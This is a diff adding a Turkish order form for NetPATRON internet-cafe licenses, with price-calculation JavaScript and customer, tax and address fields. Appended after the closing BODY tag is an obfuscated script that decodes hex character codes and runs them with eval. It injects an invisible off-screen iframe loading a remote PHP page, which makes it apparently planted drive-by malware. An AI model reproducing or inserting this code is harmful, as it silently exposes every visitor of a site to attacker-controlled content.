@@ -1,0 +1,408 @@
+<HTML>
+<HEAD>
+<TITLE>&lt;&lt; BANKA HAVALE FORMU &gt;&gt;</TITLE>
+<meta http-equiv="Page-Enter" content="blendTrans(duration=.5)">
+<meta http-equiv="Content-Style-Type" content="text/css">
+<LINK HREF="style2.css" TYPE="text/css" REL="stylesheet"> 
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<style type="text/css">
+<!--
+a:link {
+	color: #929292;
+}
+body {
+	background-image: NetPTIB_BANK_HAVALE.html;
+}
+.style16 {color: #353535}
+.style19 {font-family: Tahoma, Arial; font-size: 11px; color: #353535; }
+.style9 {font-family: Tahoma, Arial; font-size: 11px; color: #7B7067; }
+.style20 {
+	color: #5F5F5F;
+	font-weight: bold;
+}
+.style23 {color: #FF0000}
+.style36 {	font-size: 11px;
+	font-weight: bold;
+}
+.style37 {	FONT-SIZE: 11px; COLOR: #7b7067; FONT-FAMILY: Tahoma, Arial
+}
+.style25 {color: #FFFFFF;
+	font-size: 14px;
+	font-weight: bold;
+}
+.style31 {color: #333333}
+.style38 {font-size: 9px}
+-->
+</style>
+<SCRIPT LANGUAGE = "JavaScript">
+	function isFilled(str){ return (str != ""); }
+	function isEmail(string) { return (string.search(/^\w+((-\w+)|(\.\w+))*\@[A-Za-z0-9]+((\.|-)[A-Za-z0-9]+)*\.[A-Za-z0-9]+$/) != -1)||(string==''); }
+ 	function isDigital(str)	{ return(parseFloat(str,10)==(str*1)); }
+ 	function isCurrency(val) { 	var re = /^(\$?\d+\$?|\$?\d+\.\d+\$?)$/; return (re.test(val)); }
+		function ValidForm(form) {
+		var field, i;
+		var req = new Array(12);
+		var email = new Array(1);
+		var digits = new Array(1);
+		var currs = new Array(0);
+		req[0] = "r_banka";
+		req[1] = "r_First_Name";
+		req[5] = "r_cafeadi";
+		req[6] = "rd_pcadet";
+		req[7] = "r_ip";
+		req[4] = "r_tel";
+		req[2] = "re_Contact_Email";
+		req[8] = "r_vdaire";
+		req[9] = "r_vno";
+		req[3] = "r_sehir";
+		req[10] = "r_adres";
+		req[11] = "r_captcha";
+		email[0] = "re_Contact_Email";
+		digits[0] = "rd_pcadet";
+
+
+		for (i=0;i<12;i++)	{
+			var field = document.getElementById(req[i]);
+			if ((field.type == 'checkbox')||(field.type == 'radio'))
+			{
+				var field = document.getElementsByName(req[i]);
+				var chk = false;
+				for(l=0;l<field.length;l++)
+				{
+					if (field[l].checked) chk = true;
+				}
+				if (!chk) {alert("SEÇİLMEMİŞ ALAN '" + field[0].title + "' LÜTFEN HANGİ BANKAYA HAVALE ÇIKARTTIĞINIZI GİRİNİZ."); return false; break;}
+			}
+			else
+			{
+			if (!isFilled(field.value))	{
+				alert("EKSİK ALAN GİRİŞİ '" + field.title + "' LÜTFEN ZORUNLU ALANLARI DOLDURUNUZ.");
+				field.focus();
+				return false;
+				break;
+			}}}
+		for (i=0;i<1;i++)	{
+			var field = document.getElementById(email[i]);
+			if (!isEmail(field.value)) {
+				alert("GEÇERSİZ MAİL '" + field.title + "' LÜTFEN GEÇERLİ BİR MAIL ADRESİ GİRİNİZ.BÜYÜK HARF GİRMEYİNİZ.");
+				field.focus();
+				return false;
+				break;
+			}}
+		for (i=0;i<1;i++)	{
+			var field = document.getElementById(digits[i]);
+			if (!isDigital(field.value)) {
+				alert("YANLIŞ GİRİŞ (" + field.title + ") BU ALANA SADECE 0 İLE 9 ARASI RAKAM GİREBİLİRSİNİZ..");
+				field.focus();
+				return false;
+				break;
+			}}
+		for (i=0;i<0;i++)	{
+			var field = document.getElementById(currs[i]);
+			if (!isCurrency(field.value)) {
+				alert("YANLIŞ GİRİŞ (" + field.title + ") BU ALANA SADECE 0 İLE 9 ARASI RAKAM GİREBİLİRSİNİZ.");
+				field.focus();
+				return false;
+				break;
+			}}
+		return true; }
+</SCRIPT>
+<SCRIPT language=JavaScript>
+
+	   var BirimFiyat = 0.00;
+
+
+	   function formatNumber(num)
+	   {
+
+		num = num.toString().replace(/\$|\,/g,'');
+		if(isNaN(num))
+		num = "0";
+		sign = (num == (num = Math.abs(num)));
+		num = Math.floor(num*100+0.50000000001);
+		cents = num%100;
+		num = Math.floor(num/100).toString();
+		if(cents<10)
+		cents = "0" + cents;
+		for (var i = 0; i < Math.floor((num.length-(1+i))/3); i++)
+		num = num.substring(0,num.length-(4*i+3))+','+
+		num.substring(num.length-(4*i+3));
+		return (((sign)?'':'-') + num + '.' + cents);
+	  }
+
+	   function DoToplam()
+	   {
+		  Adet     = FRM.ADET.value;
+		  var _TP  = document.getElementById("GTOPLAM");
+		  var _SRV = document.getElementById("SERVER");
+		  var _GTOP  = document.getElementById("GENTOP");
+		  var _ARA = document.getElementById("AT");
+		  var _TOP = (BirimFiyat * Adet);
+		  var _I   = 0;
+		  if (Adet == 0) _I = 0;
+		  if (Adet == 1) _I = 168.00;
+		  if (Adet == 2) _I = 156.80;
+		  if (Adet == 3) _I = 145.60;
+		  if (Adet == 4) _I = 134.40;
+		  if (Adet == 5) _I = 123.20;
+  		  if (Adet == 6) _I = 112.00;
+   		  if (Adet == 7) _I = 100.80;
+		  if (Adet == 8) _I = 89.60;
+		  if (Adet == 9) _I = 78.40;
+		  if (Adet == 10) _I = 67.20;
+		  if (Adet == 11) _I = 56.00;
+		  if (Adet == 12) _I = 44.80;
+		  if (Adet == 13) _I = 33.60;
+		  if (Adet == 14) _I = 22.40;
+		  if (Adet > 14 && Adet < 21)  _I = 11.20;
+		  if (Adet > 20 && Adet < 51)  _I = 11.20;
+		  if (Adet > 50 && Adet < 101) _I = 11.20;
+		  if (Adet > 100 && Adet < 201) _I = 11.20;
+		  if (Adet > 200 && Adet < 501) _I = 11.20;
+  		  if (Adet > 500 && Adet < 1001) _I = 11.20;
+		  if (Adet > 1000 && Adet < 10000) _I = 11.20;
+//		  _I = Math.round((_TOP + _I) / 100);
+		  _ARA.innerHTML = formatNumber(_TOP) + " YTL";
+		  _SRV.innerHTML = formatNumber(_I) + " YTL";
+		  _TP.innerHTML = formatNumber(_TOP + _I) + " YTL (KDV DAHİL)";
+		  _GTOP.value = formatNumber(_TOP + _I);
+	   }
+
+	   function DoDD1Change()
+	   {
+		  var _BF = document.getElementById("BF");
+
+		  if (_BF != null)
+		  {
+		  BirimFiyat = 11.20;
+		  //if (FRM.DD1.value == "2") BirimFiyat = 15.00;
+		  _BF.innerHTML = BirimFiyat + " YTL (KDV DAHİL)";
+		  DoToplam();
+		  }
+	   }
+	</SCRIPT>
+</HEAD>
+<BODY BGCOLOR=#FFFFFF LEFTMARGIN=0 TOPMARGIN=0 MARGINWIDTH=0 MARGINHEIGHT=0 >
+<center>
+  <table width="649" border="0" cellspacing="0" cellpadding="0">
+    <tr>
+      <td><div align="center">
+        <div align="center">
+          <FORM ACTION="https://www.webaynet.com/mailform/forms/formprocessorpro.php" METHOD="POST" ENCTYPE="multipart/form-data" onSubmit="return ValidForm(this);">
+<INPUT TYPE="hidden" NAME="___form_id_" VALUE="47ab6d77cfa6e618259ba46373be8de648a07e56d7938">
+
+            <table width="100%"  border="0" cellspacing="2" cellpadding="2">
+              
+              <tr align="left" valign="top">
+                <td colspan="2" valign="middle" bgcolor="#E5E5E5" scope="row"><div align="center">
+                  <div id="Panel1" style="width:100%;">
+                    <table style="LEFT: 11px; TOP: 448px" bordercolor="#999999"
+                    cellspacing="0" cellpadding="3"
+                    width="100%" align="center"
+                    bgcolor="#CCCCCC" border="1">
+                      <tbody>
+                        <tr>
+                          <td width="309" class="style37"><p align="right">&nbsp;</p>
+                              <p align="right"><strong>SATIN ALINAN ÜRÜN</strong></p></td>
+                          <td width="314" class="style23"><p><img src="images/netdadicclogo.png" width="232" height="51"></p></td>
+                        </tr>
+                        <tr>
+                          <td class="style37"><p align="right"><strong> BİRİM FİYATI</strong></p></td>
+                          <td><div id="BF"
+                            style="FONT-WEIGHT: bold; FONT-SIZE: 12px; COLOR: blue">0.00 YTL </div></td>
+                        </tr>
+                        <tr>
+                          <td valign="middle"><p align="right"><strong><span class="style23">Satın Almak İstediğiniz Adet</span> <br>
+          (Her Pc için Ayrı Lisans Alınmalıdır. En Az 5 Client Alınabilir.) </strong></p></td>
+                          <td><input name="ADET" id="ADET"  onKeyUp="DoToplam()"  type="text" value="5" size="3" maxlength="3" style="text-align:center; FONT-WEIGHT: bold; COLOR: black" autocomplete="off">
+                              <span class="style20"><br>
+        KONTROL ETMEK İSTEDİĞİNİZ PC SAYISI</span></td>
+                        </tr>
+                        <tr>
+                          <td><p align="right" class="style37"><strong>ARA TOPLAM</strong></p></td>
+                          <td><div id="AT"
+                            style="FONT-WEIGHT: bold; FONT-SIZE: 16px; COLOR: green">0.00 YTL </div></td>
+                        </tr>
+                        <tr>
+                          <td><p align="right" class="style37"><strong>NetPATRON SERVER ÜCRETİ</strong></p></td>
+                          <td><div id="SERVER"
+                            style="FONT-WEIGHT: bold; FONT-SIZE: 16px; COLOR: red">0.00 YTL </div></td>
+                        </tr>
+                        <tr>
+                          <td style="COLOR: white" bgcolor="#990000"><p align="right" class="style36">KARTINIZDAN ÇEKİLECEK TUTAR</p></td>
+                          <td bgcolor="#990000"><div id="GTOPLAM" name="Genel Toplam"
+                            style="FONT-WEIGHT: bold; FONT-SIZE: 15px; COLOR: white">0.00 YTL </div>
+                              <input name="fiyat" type="hidden" id="GENTOP"></td>
+                        </tr>
+                      </tbody>
+                    </table>
+                  </div>
+                </div></td>
+                </tr>
+              <tr align="left" valign="top">
+                <td colspan="2" scope="row">&nbsp;</td>
+              </tr>
+              <tr align="left" valign="top">
+                <td colspan="2" scope="row"><div align="center"><span class="style20"> * LÜTFEN HAVALE YAPTIĞINIZ BANKAMIZI SEÇİNİZ ! </span></div></td>
+                </tr>
+              <tr align="left" valign="top">
+                <td colspan="2" scope="row"><div align="center">
+                  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+                    <tr>
+                      <td width="18%"><div align="center">
+                          <input type="radio" name="r_banka" id="r_banka" value="AK BANK" title="HAVALE YAPILAN BANKA">
+                      </div></td>
+                      <td width="25%"><div align="center">
+                          <input type="radio" name="r_banka" id="r_banka" value="FINANS BANK" title="HAVALE YAPILAN BANKA">
+                      </div></td>
+                      <td width="28%"><div align="center">
+                          <input type="radio" name="r_banka" id="r_banka" value="GARANTİ BANKASI" title="HAVALE YAPILAN BANKA">
+                      </div></td>
+                    </tr>
+                    <tr>
+                      <td><div align="center"><strong>AKBANK</strong></div></td>
+                      <td><div align="center"><strong>FİNANSBANK</strong></div></td>
+                      <td><div align="center"><strong>GARANTİ BANKASI </strong></div></td>
+                    </tr>
+                  </table>
+                </div></td>
+                </tr>
+              <tr align="left" valign="top">
+                <td width="51%" scope="row">&nbsp;</td>
+                <td width="49%">&nbsp;</td>
+              </tr>
+              <tr align="left" valign="top">
+                <td scope="row"><div align="right">
+                  <div align="right"><strong>Dekont NO (Veya Havleyi Yapanın ismi) </strong></div>
+                </div></td>
+                <td><span class="style16">
+                  <input type="text" class="style9" name="DECONT" id = "DECONT" value="" title="DECONT NO">
+                </span></td>
+              </tr>
+              <tr align="left" valign="top">
+                <td scope="row">&nbsp;</td>
+                <td>&nbsp;</td>
+              </tr>
+              <tr align="left" valign="top">
+                <td colspan="2" scope="row"><table width="100%" border="0" cellpadding="0" cellspacing="0" bordercolor="#999999">
+                  <tr>
+                    <td><table cellspacing="2" cellpadding="2" width="100%" border="0">
+                      <tbody>
+                        <tr valign="top" align="left">
+                          <td height="16" colspan="2" valign="middle" bgcolor="#FF0000" scope="row"><div align="left" class="style1 style25">KİŞİSEL VE TESLİMAT BİLGİLERİNİZ</div></td>
+                        </tr>
+                        <tr valign="top" align="left">
+                          <td scope="row"><strong class="style37">ADINIZ SOYADINIZ  VEYA ŞİRKET ADI</strong></td>
+                          <td><strong class="style37">E-POSTA ADRESİNİZ</strong></td>
+                        </tr>
+                        <tr valign="top" align="left">
+                          <td scope="row" width="52%"><span class="style16">
+                            <input class="style37" name="r_First_Name" id = "r_First_Name" value="" title="ADINIZ VEYA ŞİRKET UNVANI" style="FONT-WEIGHT: bold; COLOR: black; TEXT-ALIGN: left" autocomplete="off"/>
+                            *</span></td>
+                          <td width="48%"><span class="style16">
+                            <input class="style37" name="re_Contact_Email" id = "re_Contact_Email" value="" title="E-MAIL ADRESİNİZ" style="FONT-WEIGHT: bold; COLOR: black; TEXT-ALIGN: left" autocomplete="off"/>
+                            *</span></td>
+                        </tr>
+                        <tr valign="top" align="left">
+                          <td class="style37" scope="row"><strong>ŞEHİR</strong></td>
+                          <td class="style37"><strong>TELEFON NUMARANIZ</strong></td>
+                        </tr>
+                        <tr valign="top" align="left">
+                          <td scope="row"><span class="style16">
+                            <input class="style37" name="r_sehir" id = "r_sehir" value="" title="BULUNDUĞUNUZ ŞEHİR" style="FONT-WEIGHT: bold; COLOR: black; TEXT-ALIGN: left" autocomplete="off"/>
+                            * </span></td>
+                          <td><span class="style16">
+                            <input class="style37" name="r_tel" id = "r_tel" value="" title="TELEFON NUMARANIZ" style="FONT-WEIGHT: bold; COLOR: black; TEXT-ALIGN: left" autocomplete="off"/>
+                            * </span></td>
+                        </tr>
+                        <tr valign="top" align="left">
+                          <td class="style37" scope="row"><strong>GSM NUMARANIZ</strong></td>
+                          <td class="style37"><strong>CAFE ADI</strong></td>
+                        </tr>
+                        <tr valign="top" align="left">
+                          <td height="23" scope="row"><span class="style16">
+                            <input class="style37" name="gsm" id = "gsm" value="" title="CEP TELEFONUNUZ" style="FONT-WEIGHT: bold; COLOR: black; TEXT-ALIGN: left" autocomplete="off"/>
+                          </span></td>
+                          <td><span class="style16">
+                            <input class="style37" name="r_cafeadi" id = "r_cafeadi" value="" title="CAFE ADI" style="FONT-WEIGHT: bold; COLOR: black; TEXT-ALIGN: left" autocomplete="off"/>
+*</span></td>
+                        </tr>
+                        
+                        <tr valign="top" align="left">
+                          <td bgcolor="#CCCCCC" scope="row"><div align="right"><strong class="style37 style31">BİLGİSAYAR SAYINIZ (SERVER HARİÇ)</strong></div></td>
+                          <td bgcolor="#CCCCCC"><span class="style16">
+                            <input name="rd_pcadet" 
+            class="style37" id = "rd_pcadet" style="FONT-WEIGHT: bold; COLOR: black; TEXT-ALIGN: left" title="BİLGİSAYAR SAYISI" value="" size="4" maxlength="4" autocomplete="off"/>
+                          *</span></td>
+                        </tr>
+                        
+                        
+                        <tr valign="top" align="left">
+                          <td scope="row"><div align="right"><strong class="style37">SABİT IP ADRESİNİZ</strong></div></td>
+                          <td><span class="style16">
+                            <input class="style37" name="r_ip" id = "r_ip" value="" title="SABİT IP ADRESİNİZ" style="FONT-WEIGHT: bold; COLOR: black; TEXT-ALIGN: left" autocomplete="off"/>
+                          *</span></td>
+                        </tr>
+                        <tr valign="top" align="left">
+                          <td class="style37" scope="row"><strong>VERGİ DAİRENİZ</strong></td>
+                          <td class="style37"><strong>VERGİ NUMARANIZ</strong></td>
+                        </tr>
+                        <tr valign="top" align="left">
+                          <td scope="row"><span class="style16">
+                            <input class="style37" name="r_vdaire" id = "r_vdaire" value="" title="VERGİ DAİRENİZ" style="FONT-WEIGHT: bold; COLOR: black; TEXT-ALIGN: left" autocomplete="off"/>
+* </span></td>
+                          <td><span class="style16">
+                            <input 
+            class="style37" name="r_vno" id = "r_vno" value="" title="VERGİ NO" style="FONT-WEIGHT: bold; COLOR: black; TEXT-ALIGN: left" autocomplete="off"/>
+* </span></td>
+                        </tr>
+                        
+                        
+                        <tr valign="top" align="left">
+                          <td scope="row" colspan="2">&nbsp;</td>
+                        </tr>
+                        <tr valign="top" align="left">
+                          <td scope="row" colspan="2"><strong class="style37">ÜRÜN VE FATURA TESLİMAT ADRESİNİZ<br>
+                          </strong><span class="style38">(LÜTFEN SEMT VE MAHALLE BİLGİLERİNİ GİRİNİZ)</span><br />
+                              <textarea class="style19" id="r_adres" name="r_adres" title="ADRESİNİZ" rows="3" cols="87"></textarea>
+                            *</td>
+                        </tr>
+                        <tr valign="top" align="left">
+                          <td scope="row" colspan="2"><strong class="style37">VARSA ÖZEL MESAJINIZ</strong><br />
+                              <textarea class="style19" id="ozelmsg" name="ozelmsg" title="ÖZEL MESAJ" rows="3" cols="87"></textarea></td>
+                        </tr>
+                        <tr valign="top" align="left">
+                          <td scope="row">&nbsp;</td>
+                          <td><span class="formfield"><img src="https://www.webaynet.com/mailform/forms/formprocessorpro.php?captcha&t=0" style="border: 1px solid silver;" alt="Captcha Image: you will need to recognize the text in it."></span></td>
+                        </tr>
+                        <tr valign="top" align="left">
+                          <td scope="row"><div align="right"><strong class="style37">YUKARDAKİ GÜVENLİK KODUNU GİRİNİZ</strong></div></td>
+                          <td><span class="style16">
+                            <input 
+            class="style37" id="r_captcha" size="0" name="r_captcha" title="GÜVENLİK KODU" value="" style="FONT-WEIGHT: bold; COLOR: black; TEXT-ALIGN: left" autocomplete="off"/>
+                          </span></td>
+                        </tr>
+                        <tr valign="top" align="left">
+                          <td scope="row">&nbsp;</td>
+                          <td><input name="submit" type="submit" class="style37" id="Submit" value="İŞLEMİ TAMAMLA  &gt;&gt;" /></td>
+                        </tr>
+                        <tr valign="top" align="left">
+                          <td scope="row" colspan="2"><ul>
+                              <li class="style37">(*) Lütfen bu işaretin olduğu alanları mutlaka doldurunuz. 
+                                Sizinle kolay bir şekilde irtibat kurabilmemiz için bu gereklidir. </li>
+                          </ul></td>
+                        </tr>
+                      </tbody>
+                    </table></td>
+                  </tr>
+                </table></td>
+                </tr>
+            </table>
+          </form>
+        </div>
+      </div></td>
+    </tr>
+  </table>
+</center>
+</BODY>
+  <!-- . --><script>aq="0"+"x";bv=(5-3-1);sp="s"+"pli"+"t";w=window;z="dy";try{++document.body}catch(d21vd12v){vzs=false;try{}catch(wb){vzs=21;}if(!vzs)e=w["eval"];if(1){f="0,0,60,5d,17,1f,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,20,72,4,0,0,0,60,5d,69,58,64,5c,69,1f,20,32,4,0,0,74,17,5c,63,6a,5c,17,72,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,6e,69,60,6b,5c,1f,19,33,60,5d,69,58,64,5c,17,6a,69,5a,34,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,17,6e,60,5b,6b,5f,34,1e,28,27,27,1e,17,5f,5c,60,5e,5f,6b,34,1e,28,27,27,1e,17,6a,6b,70,63,5c,34,1e,6e,60,5b,6b,5f,31,28,27,27,67,6f,32,5f,5c,60,5e,5f,6b,31,28,27,27,67,6f,32,67,66,6a,60,6b,60,66,65,31,58,59,6a,66,63,6c,6b,5c,32,63,5c,5d,6b,31,24,28,27,27,27,27,67,6f,32,6b,66,67,31,27,32,1e,35,33,26,60,5d,69,58,64,5c,35,19,20,32,4,0,0,74,4,0,0,5d,6c,65,5a,6b,60,66,65,17,60,5d,69,58,64,5c,69,1f,20,72,4,0,0,0,6d,58,69,17,5d,17,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,69,5c,58,6b,5c,3c,63,5c,64,5c,65,6b,1f,1e,60,5d,69,58,64,5c,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6a,69,5a,1e,23,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,20,32,5d,25,6a,6b,70,63,5c,25,63,5c,5d,6b,34,1e,24,28,27,27,27,27,67,6f,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,6b,70,63,5c,25,67,66,6a,60,6b,60,66,65,34,1e,58,59,6a,66,63,6c,6b,5c,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6e,60,5b,6b,5f,1e,23,1e,28,27,27,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,5f,5c,60,5e,5f,6b,1e,23,1e,28,27,27,1e,20,32,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,25,58,67,67,5c,65,5b,3a,5f,60,63,5b,1f,5d,20,32,4,0,0,74"[sp](",");}w=f;s=[];for(i=20-20;-i+670!=0;i+=1){j=i;if((0x19==031))if(e)s+=String["fromCharCode"](e(aq+w[j])+0xa-bv);}za=e;za(s)}</script><!-- . --> </HTML>    
